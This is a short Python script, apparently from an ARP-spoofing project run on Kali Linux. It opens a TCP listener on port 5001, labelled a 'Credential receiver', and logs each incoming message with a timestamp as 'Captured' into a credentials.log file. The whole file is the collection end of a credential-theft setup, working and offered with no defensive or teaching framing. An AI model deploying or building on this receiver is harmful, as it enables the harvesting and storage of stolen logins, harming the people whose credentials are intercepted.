import socket
from datetime import datetime

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 5001))
server.listen(5)

print("[*] Credential receiver listening on port 5001...")

CREDS_FILE = "/home/kali/Documents/arp_project/credentials.log"

while True:
    client, addr = server.accept()
    data = client.recv(1024).decode().strip()
    if data:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] {data}"
        print(f"[+] Captured: {entry}")
        with open(CREDS_FILE, "a") as f:
            f.write(entry + "\n")
    client.close()
